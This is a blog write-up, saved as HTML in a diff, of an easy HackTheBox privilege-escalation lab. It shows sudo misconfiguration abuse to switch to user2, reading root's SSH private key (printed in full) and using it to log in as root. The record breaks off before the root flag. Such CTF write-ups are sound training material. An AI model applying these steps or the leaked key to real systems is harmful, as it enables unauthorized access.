@@ -1,0 +1,216 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Mastering Privilege Escalation Techniques"><title>Privilege Escalation</title>
+<link rel=canonical href=https://hushkat.github.io/p/privilege-escalation/><link rel=stylesheet href=/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css><meta property='og:title' content="Privilege Escalation"><meta property='og:description' content="Mastering Privilege Escalation Techniques"><meta property='og:url' content='https://hushkat.github.io/p/privilege-escalation/'><meta property='og:site_name' content='hushkat'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='HackTheBox'><meta property='article:tag' content='SSH_Keys'><meta property='article:tag' content='PrivilegeEscalation'><meta property='article:published_time' content='2023-08-11T00:00:00+00:00'><meta property='article:modified_time' content='2023-08-11T00:00:00+00:00'><meta property='og:image' content='https://hushkat.github.io/p/privilege-escalation/PriviledgeEscalation.jpg'><meta name=twitter:title content="Privilege Escalation"><meta name=twitter:description content="Mastering Privilege Escalation Techniques"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://hushkat.github.io/p/privilege-escalation/PriviledgeEscalation.jpg'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu7709170947186964225.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>hushkat</a></h1><h2 class=site-description>IT Specialist | CTF Player | Aspiring Cyber Security Analyst</h2></div></header><ol class=menu-social><li><a href=https://github.com/dr0idbot target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/dr0idbot target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>PortFolio</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><ol><li><a href=#introduction>Introduction</a></li><li><a href=#privilege-escalation-challenge>Privilege Escalation Challenge.</a></li><li><a href=#observations--findings>Observations & Findings</a></li><li><a href=#solutionflag>Solution/Flag</a></li><li><a href=#conclusion>Conclusion</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/privilege-escalation/><img src=/p/privilege-escalation/PriviledgeEscalation_hu14747477697338220774.jpg srcset="/p/privilege-escalation/PriviledgeEscalation_hu14747477697338220774.jpg 800w, /p/privilege-escalation/PriviledgeEscalation_hu8614314373172368171.jpg 1600w" width=800 height=541 loading=lazy alt="Featured image of post Privilege Escalation"></a></div><div class=article-details><header class=article-category><a href=/categories/easy/>Easy
+</a><a href=/categories/hackthebox/>HackTheBox</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/privilege-escalation/>Privilege Escalation</a></h2><h3 class=article-subtitle>Mastering Privilege Escalation Techniques</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Aug 11, 2023</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>7 minute read</time></div></footer></div></header><section class=article-content><p>This image is courtesy of <a class=link href=https://cyberhoot.com/cybrary/privilege-escalation-attack/ target=_blank rel=noopener>CyberHoot</a></p><h3 id=introduction>Introduction</h3><p>After breaching a target&rsquo;s defenses and exploiting system vulnerabilities, hackers often find themselves with limited privileges. To overcome this, privilege escalation becomes essential to navigate through defenses and gain the muscle needed to carry out a successful attack.</p><p><em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.</em></p><h3 id=privilege-escalation-challenge>Privilege Escalation Challenge.</h3><p>Welcome back to another HackTheBox challenge, an easy Capture The Flag (CTF) exercise. The past few blogs have been covering the module <a class=link href=https://academy.hackthebox.com/course/preview/getting-started target=_blank rel=noopener>Getting Started</a>. The instructions provided are as follows:
+<img src=/p/privilege-escalation/PrivilegeEscalation1.jpg width=1021 height=300 srcset="/p/privilege-escalation/PrivilegeEscalation1_hu6869482866601827893.jpg 480w, /p/privilege-escalation/PrivilegeEscalation1_hu13295729096729830807.jpg 1024w" loading=lazy alt="chall desc" class=gallery-image data-flex-grow=340 data-flex-basis=816px>
+<a class=link href=https://en.wikipedia.org/wiki/Secure_Shell target=_blank rel=noopener>SSH</a> (Secure Shell) is a secure network communication protocol allowing encrypted connections between computers, making it suitable for use on insecure networks.</p><h3 id=observations--findings>Observations & Findings</h3><p>We begin by using the provided credentials to establish an SSH connection to the target machine:
+If you&rsquo;re following through <strong>Note</strong> that the machine IP and port number might be different in your case, make sure you replace that with what you have been given.</p><p>Our first command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>┌──(papab3ar㉿kali)-[~]
+</span></span><span class=line><span class=cl>└─$ ssh user1@94.237.49.11 -p 31973
+</span></span></code></pre></td></tr></table></div></div><p>Upon connection, a message about host authenticity appears. Confirm by typing &ldquo;yes&rdquo; and entering the provided password. A successful login grants terminal access:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.10.0-18-amd64 x86_64)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
+</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
+</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>This system has been minimized by removing packages and content that are
+</span></span><span class=line><span class=cl>not required on a system that users do not log into.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>To restore this content, you can run the &#39;unminimize&#39; command.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The programs included with the Ubuntu system are free software;
+</span></span><span class=line><span class=cl>the exact distribution terms for each program are described in the
+</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span class=line><span class=cl>applicable law.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$
+</span></span></code></pre></td></tr></table></div></div><p>Attempting to list directories reveals limited information. Exploring further, we discover another user, user2:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cd ../
+</span></span><span class=line><span class=cl>user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/home$ ls
+</span></span><span class=line><span class=cl>user1  user2
+</span></span></code></pre></td></tr></table></div></div><p>Navigation to user2&rsquo;s directory uncovers the flag.txt file, but access is denied:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat: flag.txt: Permission denied
+</span></span></code></pre></td></tr></table></div></div><p>What a bummer! our current user has no permission to read user2 files or documents. So now I want to see the list of permissions the users on this machine have so I use:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo -l
+</span></span></code></pre></td></tr></table></div></div><p>The output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Matching Defaults entries for user1 on
+</span></span><span class=line><span class=cl>    ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User user1 may run the following commands on
+</span></span><span class=line><span class=cl>        ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:
+</span></span><span class=line><span class=cl>    (user2 : user2) NOPASSWD: /bin/bash
+</span></span></code></pre></td></tr></table></div></div><p>Something interesting shows up here about our users.
+First, we see the text <strong>NOPASSWD</strong>: Indicating that our current user (user1) is allowed to run the specified commands without being prompted for a password. This can be a security feature to streamline certain processes, but it also carries some security risks.</p><p>Then we note the <strong>/bin/bash</strong>: This is the path to the &ldquo;bash&rdquo; shell executable. Allowing user1 to run &ldquo;/bin/bash&rdquo; means they have the ability to start an interactive shell session. This could potentially grant them significant control over the system.</p><p>With this in mind, I now want to see if it will work. So I run the following command for user2 as user1:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo -u user2 /bin/bash
+</span></span></code></pre></td></tr></table></div></div><p>From the terminal, this seems to have worked since the CLI switched from:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:
+</span></span></code></pre></td></tr></table></div></div><p>to this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ 
+</span></span></code></pre></td></tr></table></div></div><p>Notice that we now have user2 access. So, once again, we try to read the <em>flag.txt</em> file and manage to get the flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ ls
+</span></span><span class=line><span class=cl>flag.txt
+</span></span><span class=line><span class=cl>user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cat flag.txt 
+</span></span><span class=line><span class=cl>HTB{l473r4l_********_**_*******_u53r}
+</span></span></code></pre></td></tr></table></div></div><p>Ah great, so what, are we done? Or is there more we could do here? We have further instructions:
+<img src=/p/privilege-escalation/PriviledgeEscalation0.jpg width=1026 height=58 srcset="/p/privilege-escalation/PriviledgeEscalation0_hu7155434506315083472.jpg 480w, /p/privilege-escalation/PriviledgeEscalation0_hu8725563002238112223.jpg 1024w" loading=lazy alt="chall blog" class=gallery-image data-flex-grow=1768 data-flex-basis=4245px>
+Now we try to see if we can be the <strong>root</strong> user for this machine, escalating our privileges even further. First I navigate to the root user folder using the following commands:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cd ../../
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>cd root
+</span></span></code></pre></td></tr></table></div></div><p>Then I list all directories and this is the output I get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/root$ ls -a
+</span></span><span class=line><span class=cl>.  ..  .bash_history  .bashrc  .profile  .ssh  .viminfo  flag.txt
+</span></span></code></pre></td></tr></table></div></div><p>As you can see here, we have our <em>flag.txt</em> file. I&rsquo;m tempted to open it, and I do, but again, I get denied permission to do so. I then notice another interesting directory,<strong>.ssh</strong>. So I navigate to it and list its contents.</p><p>The <strong>.ssh</strong> folder in a user&rsquo;s home directory on a Unix-like operating system that contains important files and directories related to SSH (Secure Shell) authentication and communication.</p><p><strong>authorized_keys</strong>: Contains a list of public keys authorized to access the user account using SSH key-based authentication. Each line in this file represents a separate public key. When a client (remote computer) attempts to connect to the user account, the server checks if the client&rsquo;s public key matches any of the keys listed in this file. If there&rsquo;s a match, the client is granted access without needing to enter a password.</p><p><strong>id_rsa</strong>: A private key file for the user&rsquo;s SSH key pair. The private key is kept secret and should never be shared or exposed. It is used for authentication when the user tries to log in to remote servers. When the user initiates an SSH connection, their local computer uses the private key to sign a challenge from the server, proving their identity without transmitting the actual private key. Only the corresponding public key is shared with remote servers.</p><p><strong>id_rsa.pub</strong>: Contains the public key that corresponds to the private key (id_rsa). The public key can be freely shared and is typically copied to remote servers to set up key-based authentication. Remote servers use the public key to verify the user&rsquo;s identity during the SSH authentication process.</p><p>Now it is time to see if we have access to the <strong>id_rsa</strong> file. If we do, we can use the root user&rsquo;s private key to gain root access to this machine hence further elevating our privileges from user2. I open this file using the cat command and sure enough, I get access to the private key.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat id_rsa
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span class=line><span class=cl>NhAAAAAwEAAQAAAYEAt3nX57B1Z2nSHY+aaj4lKt9lyeLVNiFh7X0vQisxoPv9BjNppQxV
+</span></span><span class=line><span class=cl>PtQ8csvHq/GatgSo8oVyskZIRbWb7QvCQI7JsT+Pr4ieQayNIoDm6+i9F1hXyMc0VsAqMk
+</span></span><span class=line><span class=cl>05z9YKStLma0iN6l81Mr0dAI63x0mtwRKeHvJR+EiMtUTlAX9++kQJmD9F3lDSnLF4/dEy
+</span></span><span class=line><span class=cl>G4WQSAH7F8Jz3OrRKLprBiDf27LSPgOJ6j8OLn4bsiacaWFBl3+CqkXeGkecEHg5dIL4K+
+</span></span><span class=line><span class=cl>aPDP2xzFB0d0c7kZ8AtogtD3UYdiVKuF5fzOPJxJO1Mko7UsrhAh0T6mIBJWRljjUtHwSs
+</span></span><span class=line><span class=cl>ntrFfE5trYET5L+ov5WSi+tyBrAfCcg0vW1U78Ge/3h4zAG8KaGZProMUSlu3MbCfl1uK/
+</span></span><span class=line><span class=cl>EKQXxCNIyr7Gmci0pLi9k16A1vcJlxXYHBtJg6anLntwYVxbwYgYXp2Ghj+GwPcj2Ii4fq
+</span></span><span class=line><span class=cl>ynRFP1fsy6zoSjN9C977hCh5JStT6Kf0IdM68BcHAAAFiA2zO0oNsztKAAAAB3NzaC1yc2
+</span></span><span class=line><span class=cl>EAAAGBALd51+ewdWdp0h2Pmmo+JSrfZcni1TYhYe19L0IrMaD7/QYzaaUMVT7UPHLLx6vx
+</span></span><span class=line><span class=cl>mrYEqPKFcrJGSEW1m+0LwkCOybE/j6+InkGsjSKA5uvovRdYV8jHNFbAKjJNOc/WCkrS5m
+</span></span><span class=line><span class=cl>tIjepfNTK9HQCOt8dJrcESnh7yUfhIjLVE5QF/fvpECZg/Rd5Q0pyxeP3RMhuFkEgB+xfC
+</span></span><span class=line><span class=cl>c9zq0Si6awYg39uy0j4Dieo/Di5+G7ImnGlhQZd/gqpF3hpHnBB4OXSC+Cvmjwz9scxQdH
+</span></span><span class=line><span class=cl>dHO5GfALaILQ91GHYlSrheX8zjycSTtTJKO1LK4QIdE+piASVkZY41LR8ErJ7axXxOba2B
+</span></span><span class=line><span class=cl>E+S/qL+VkovrcgawHwnINL1tVO/Bnv94eMwBvCmhmT66DFEpbtzGwn5dbivxCkF8QjSMq+
+</span></span><span class=line><span class=cl>xpnItKS4vZNegNb3CZcV2BwbSYOmpy57cGFcW8GIGF6dhoY/hsD3I9iIuH6sp0RT9X7Mus
+</span></span><span class=line><span class=cl>6EozfQve+4QoeSUrU+in9CHTOvAXBwAAAAMBAAEAAAGAMxEtv+YEd3kjq2ip4QJVE/7D9R
+</span></span><span class=line><span class=cl>I2p+9Ys2JRgghFsvoQLeanc/Hf1DH8dTM06y2/EwRvBbmQ9//J4+Utdif8tD1J9BSt6HyN
+</span></span><span class=line><span class=cl>F9hwG/dmzqij4NiM7mxLrA2mcQO/oJKBoNvcmGXEYkSHqQysAti2XDisrP2Clzh5CjMfPu
+</span></span><span class=line><span class=cl>DjIKyc6gl/5ilOSBeU11oqQ/MzECf3xaMPgUh1OTr+ZmikmzsRM7QtAme3vkQ4rUYabVaD
+</span></span><span class=line><span class=cl>2Gzidcle1AfITuY5kPf1BG2yFAd3EzddnZ6rvmZxsv2ng9u3Y4tKHNttPYBzoRwwOqlfx9
+</span></span><span class=line><span class=cl>PyqNkT0c3sV4BdhjH5/65w7MtkufqF8pvMFeCyywJgRL/v0/+nzY5VN5dcoaxkdlXai3DG
+</span></span><span class=line><span class=cl>5/sVvliVLHh67UC7adYcjrN49g0S3yo1W6/x6n+GcgCH8wHKHDvh5h09jdmxDqY3A8jTit
+</span></span><span class=line><span class=cl>CeTUQKMlEp5ds0YKfzN1z4lj7NpCv003I7CQwSESjVtYPKia17WvOFwMZqK/B9zxoxAAAA
+</span></span><span class=line><span class=cl>wQC8vlpL0kDA/CJ/nIp1hxJoh34av/ZZ7nKymOrqJOi2Gws5uwmrOr8qlafg+nB+IqtuIZ
+</span></span><span class=line><span class=cl>pTErmbc2DHuoZp/kc58QrJe1sdPpXFGTcvMlk64LJ+dt9sWEToGI/VDF+Ps3ovmeyzwg64
+</span></span><span class=line><span class=cl>+XjUNQ6k9VLZqd2M5rhONefNxM+LKR4xjZWHyE+neWMSgELtROtonyekaPsjOEydSybFoD
+</span></span><span class=line><span class=cl>cSYlNtEk6EW92xZBojJB7+4RGKh3+YNwvocvUkHWDEKADBO7YAAADBAPRj/ZTM7ATSOl0k
+</span></span><span class=line><span class=cl>TcHWJpTiaw8oSWKbAmvqAtiWarsM+NDlL6XHqeBL8QL+vczaJjtV94XQc/3ZBSao/Wf8E5
+</span></span><span class=line><span class=cl>InrD4hdj1FOG6ErQZns6vG1A2VBOEl8qu1r5zKvq5A6vfSzSlmBkW7XjMLJ0GiomKw9+4n
+</span></span><span class=line><span class=cl>vPI0QJaLvUWnU/2rRm7mqFCCbaVl2PYgiO6qat9TxI2y7scsLlY8cjLjPp2ZobIZN5tu3Y
+</span></span><span class=line><span class=cl>34b8afl+MxqFW3I5pjDrfi5zWkCypILwAAAMEAwDETdoE8mZK7wOeBFrmYjYmszaD9uCA/
+</span></span><span class=line><span class=cl>m4kLJg4kHm4zHCmKUVTEb9GpEZr1hnSSVb+qn61ezSgYn3yvClGcyddIht61i7MwBt6cgl
+</span></span><span class=line><span class=cl>ZGQvP/9j2jexpc1Sq0g+l7hKK/PmOrXRk4FFXk+j6l0m7z0TGXzVDiT+yCAnv6Rla/vd3e
+</span></span><span class=line><span class=cl>7v0aCqLbhyFZBQ9WdyAMU/DKiZRM6knckt61TEL6ffzToNS+sQu0GSh6EYzdpUfevwKL+a
+</span></span><span class=line><span class=cl>QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
+</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></td></tr></table></div></div><h3 id=solutionflag>Solution/Flag</h3><p>I copy the key to my local machine in a file named id_rsa and save it, then try to use it to log in as the root user using the commands:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>──(papab3ar㉿kali)-[~]
+</span></span><span class=line><span class=cl>└─$ ssh root@94.237.49.11 -p 31973 -i id_rsa
+</span></span></code></pre></td></tr></table></div></div><p>Let me break this command down in bits:
+<strong>ssh</strong>: This is the command used to start an SSH connection.</p><p><strong><a class=link href=mailto:root@94.237.49.11>root@94.237.49.11</a></strong>: This specifies the username and IP address of the remote server. In this case, the username is &ldquo;root,&rdquo; and the IP address is &ldquo;94.237.49.11.&rdquo;</p><p><strong>-p 31973</strong>: This option specifies the port number to use for the SSH connection. The port number is set to &ldquo;31973.&rdquo;</p><p><strong>-i id_rsa</strong>: This option specifies the identity (private key) file to use for authentication. In this case, the private key file named &ldquo;id_rsa&rdquo; is being used for authentication.
+of-course we gain access to the machine as the root user as we get the welcome banner like we got during our initial access with the root user&rsquo;s shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~# 
+</span></span></code></pre></td></tr></table></div></div><p>So now we just list directories and read the contents of the <em>flag.txt</em> file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
